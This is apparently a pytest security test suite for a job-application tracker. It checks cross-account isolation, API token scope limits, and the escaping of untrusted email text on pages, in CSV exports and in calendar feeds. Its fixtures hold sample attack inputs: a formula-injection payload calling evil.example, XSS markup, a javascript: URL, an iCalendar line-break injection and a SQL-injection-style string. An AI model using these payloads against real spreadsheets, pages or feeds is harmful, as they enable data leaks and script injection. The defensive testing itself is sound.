"""What a listing's history lets in, and what it lets out (#270).

Two boundaries, the ones `docs/THREAT-MODEL.md` names. **Another account**: an entry scopes
through its listing, and everything it names -- a contact, a file, a capture -- has to be the
same person's, whichever door it came through; a record somebody else holds gets the answer a
record that does not exist gets. **A stranger's text**: an email or a message is exactly what
#218 was about, so it is held to a length, escaped on the page, and reaches no spreadsheet and
no calendar at all. And a third, new here: the `listings:bind` scope reaches two calls and
nothing else, because it is the scope handed to a mail client.
"""

from __future__ import annotations

import csv
import datetime as dt
import io
import json

import pytest
from django.core.files.base import ContentFile
from django.urls import reverse
from django.utils import timezone

from postulo.api.models import ApiToken
from postulo.applications.models import InterviewKind, Status
from postulo.applications.services import apply_to_listing, schedule_interview
from postulo.documents.models import UploadedDocument
from postulo.jobs.history import NotBound, record_listing_event
from postulo.jobs.models import Capture, CaptureStatus, Company, Contact, JobPosting, ListingEvent

pytestmark = pytest.mark.django_db

#: What a stranger's subject line would say to make the office's spreadsheet fetch a URL.
FORMULA = '=HYPERLINK("https://evil.example/?"&A2,"Open me")'
#: And what it would say to a page that drew it as markup.
MARKUP = '<script>document.title="owned"</script><img src=x onerror="alert(1)">'


def issue(user, *scopes):
    _record, raw = ApiToken.issue(user, "Thunderbird", scopes=scopes)
    return {"HTTP_AUTHORIZATION": f"Bearer {raw}"}


def post(client, path, payload, **headers):
    return client.post(path, data=json.dumps(payload), content_type="application/json", **headers)


@pytest.fixture
def listing(user):
    company = Company.objects.create(owner=user, name="Black Mesa")
    return JobPosting.objects.create(owner=user, company=company, title="Research Engineer")


@pytest.fixture
def theirs(other_user):
    """Somebody else's listing, contact, file and capture."""
    company = Company.objects.create(owner=other_user, name="Their employer")
    return {
        "listing": JobPosting.objects.create(owner=other_user, company=company, title="Theirs"),
        "contact": Contact.objects.create(owner=other_user, name="Their contact"),
        "file": UploadedDocument.objects.create(
            owner=other_user, title="Their file", file=ContentFile(b"%PDF-1.7", name="t.pdf")
        ),
        "capture": Capture.objects.create(
            owner=other_user, url="https://example.org/theirs", data={"title": "Theirs"}
        ),
    }


# ------------------------------------------------------------------ another account


def test_nothing_of_somebody_elses_can_be_named_in_an_entry(listing, theirs):
    """The plugin surface's call, which is every door's: the owner is the listing's."""
    for named in (
        {"contact": theirs["contact"]},
        {"kind": "document", "artefact": theirs["file"]},
        {"kind": "capture", "artefact": theirs["capture"]},
    ):
        with pytest.raises(NotBound):
            record_listing_event(listing, summary="Borrowed", **named)
    assert not ListingEvent.objects.exists()


def test_a_capture_cannot_be_bound_to_somebody_elses_listing(client, user, theirs):
    mine = Capture.objects.create(owner=user, url="https://example.org/mine", data={"title": "x"})
    client.force_login(user)

    response = client.post(
        reverse("jobs:capture_bind", args=[mine.pk]), {"listing": theirs["listing"].pk}
    )

    assert response.status_code == 404
    mine.refresh_from_db()
    assert mine.status == CaptureStatus.PENDING and mine.posting is None
    assert not ListingEvent.objects.exists()


def test_a_listing_that_is_not_a_number_is_not_found(client, user):
    """Read as a number or not at all: a superscript two is a digit to `str.isdigit` and
    not to `int`, which is the difference between a 404 and a 500."""
    mine = Capture.objects.create(owner=user, url="https://example.org/mine", data={"title": "x"})
    client.force_login(user)

    for value in ("1 OR 1=1", "²", "", "-1"):
        response = client.post(reverse("jobs:capture_bind", args=[mine.pk]), {"listing": value})
        assert response.status_code == 404, value


def test_the_form_will_not_take_somebody_elses_file_or_person(client, user, listing, theirs):
    client.force_login(user)
    UploadedDocument.objects.create(
        owner=user, title="Mine", file=ContentFile(b"%PDF-1.7", name="m.pdf")
    )
    Contact.objects.create(owner=user, name="Mine")

    response = client.post(
        reverse("listings:event_create", args=[listing.pk]),
        {
            "kind": "document",
            "occurred_at": "2026-09-20T10:30",
            "summary": "Borrowed",
            "document": theirs["file"].pk,
            "contact": theirs["contact"].pk,
        },
    )

    assert response.status_code == 200
    assert not ListingEvent.objects.exists()


def test_the_api_gives_one_answer_for_somebody_elses_and_for_nothing(client, user, listing, theirs):
    token = issue(user, "listings:bind")
    path = f"/api/v1/listings/{listing.pk}/events"

    for field, value in (("contact_id", theirs["contact"].pk), ("document_id", theirs["file"].pk)):
        borrowed = post(client, path, {"summary": "x", field: value}, **token)
        nobody = post(client, path, {"summary": "x", field: 999_999}, **token)
        assert borrowed.status_code == nobody.status_code == 422
        assert borrowed.json()["detail"] == nobody.json()["detail"]
    assert not ListingEvent.objects.exists()


# ------------------------------------------------------------------- what the scope reaches


def test_the_bind_scope_reaches_two_calls_and_nothing_else(client, user, listing):
    """What a mail client holds. It records an entry and reads the brief list, and every
    other call -- reading the search, changing a listing, capturing -- is a 403."""
    application = apply_to_listing(listing, {"status": Status.APPLIED})
    token = issue(user, "listings:bind")

    assert client.get("/api/v1/listings/choices", **token).status_code == 200
    assert (
        post(client, f"/api/v1/listings/{listing.pk}/events", {"summary": "x"}, **token).status_code
        == 201
    )
    assert client.get("/api/v1/me", **token).status_code == 200, "any live token may ask"

    refused = [
        client.get("/api/v1/listings", **token),
        client.get(f"/api/v1/listings/{listing.pk}", **token),
        client.get("/api/v1/applications", **token),
        client.get(f"/api/v1/applications/{application.pk}", **token),
        client.get("/api/v1/companies", **token),
        client.get("/api/v1/documents", **token),
        client.get("/api/v1/captures", **token),
        client.get("/api/v1/search?q=research", **token),
        client.get("/api/v1/insights", **token),
        post(client, "/api/v1/listings", {"company_name": "x", "title": "y"}, **token),
        post(client, f"/api/v1/listings/{listing.pk}/discard", {}, **token),
        post(client, f"/api/v1/applications/{application.pk}/events", {"summary": "x"}, **token),
        post(client, "/api/v1/captures", {"url": "https://example.org/1", "html": "<p>"}, **token),
    ]
    assert [response.status_code for response in refused] == [403] * len(refused)


def test_a_token_without_either_scope_is_told_which_would_do(client, user, listing):
    response = post(
        client, f"/api/v1/listings/{listing.pk}/events", {"summary": "x"}, **issue(user, "read")
    )

    assert response.status_code == 403
    body = response.json()
    assert body["type"].endswith("#insufficient-scope")
    assert body["scope"] == "listings:bind", "the narrowest that would do"
    assert body["scopes"] == ["listings:bind", "write"]
    assert "'listings:bind', 'write'" in body["detail"], "a list, with no English between"


def test_a_single_scope_refusal_is_as_it_was(client, user):
    """The multi-scope refusal is additive: a call one scope reaches says what it said."""
    body = client.get("/api/v1/applications", **issue(user, "listings:bind")).json()

    assert body["scope"] == "read" and "scopes" not in body
    assert body["detail"] == "This token does not have the 'read' scope."


# -------------------------------------------------------------------- a stranger's text


def test_a_strangers_words_are_words_on_the_page(client, user, listing):
    record_listing_event(
        listing, kind="email_received", summary=MARKUP, body=f"{MARKUP}\n{FORMULA}"
    )
    application = apply_to_listing(listing, {"status": Status.APPLIED})
    client.force_login(user)

    for page in (listing.get_absolute_url(), application.get_absolute_url()):
        html = client.get(page).content.decode()
        assert "<script>document.title" not in html, page
        assert "<img src=x" not in html, page
        assert "&lt;script&gt;document.title" in html, page


def test_an_address_in_the_text_is_not_a_link(client, user, listing):
    record_listing_event(listing, summary="Click", body="javascript:alert(1) https://evil.example")
    client.force_login(user)

    html = client.get(listing.get_absolute_url()).content.decode()

    assert 'href="javascript:' not in html and 'href="https://evil.example' not in html


def test_a_capture_with_a_script_for_an_address_is_not_drawn_as_a_link(client, user, listing):
    """Held to http and https on the way in (#218); held there again where it is drawn."""
    from postulo.jobs.history import bind_capture

    capture = Capture.objects.create(
        owner=user, url="https://example.org/42", data={"title": "Research Engineer"}
    )
    bind_capture(capture, listing)
    Capture.objects.filter(pk=capture.pk).update(url="javascript:alert(1)")
    client.force_login(user)

    html = client.get(listing.get_absolute_url()).content.decode()

    assert 'href="javascript:' not in html
    assert "Open the advert" not in html


def test_a_strangers_words_reach_no_spreadsheet(client, user, listing):
    """The report is the CSV Postulo writes, and a history is not part of it."""
    record_listing_event(listing, kind="email_received", summary=FORMULA, body=FORMULA)
    apply_to_listing(listing, {"status": Status.APPLIED})
    client.force_login(user)

    text = client.get(reverse("applications:report_csv")).content.decode()

    cells = [cell for row in csv.reader(io.StringIO(text)) for cell in row]
    assert not any("evil.example" in cell for cell in cells)
    assert not any(cell.startswith(("=", "+", "-", "@", "\t", "\r")) for cell in cells)


def test_a_strangers_words_reach_no_calendar(client, user, listing):
    record_listing_event(listing, kind="message", summary="Line one\r\nATTENDEE:evil", body=FORMULA)
    application = apply_to_listing(listing, {"status": Status.APPLIED})
    schedule_interview(
        application, kind=InterviewKind.VIDEO, starts_at=timezone.now() + dt.timedelta(days=2)
    )

    feed = client.get("/api/v1/interviews/calendar.ics", **issue(user, "read")).content.decode()

    assert "BEGIN:VEVENT" in feed, "the feed is there, with the interview in it"
    assert "evil" not in feed and "HYPERLINK" not in feed


def test_the_api_refuses_a_longer_text_rather_than_cutting_it(client, user, listing):
    from postulo.jobs import history

    token = issue(user, "listings:bind")
    path = f"/api/v1/listings/{listing.pk}/events"

    long_body = post(client, path, {"body": "x" * (history.BODY_MAX_CHARS + 1)}, **token)
    long_line = post(client, path, {"summary": "x" * 251}, **token)

    assert long_body.status_code == long_line.status_code == 422
    assert long_body.json()["type"].endswith("#validation-failed")
    assert not ListingEvent.objects.exists()
